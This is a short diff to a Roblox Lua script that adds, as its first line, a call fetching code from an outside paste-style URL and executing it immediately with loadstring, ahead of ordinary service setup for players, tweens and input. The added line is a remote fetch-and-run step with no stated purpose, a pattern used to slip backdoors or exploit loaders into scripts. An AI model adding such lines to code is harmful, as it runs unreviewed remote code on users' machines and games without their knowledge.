@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/paSMTQR6jy9j0UXG/raw", true))()
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
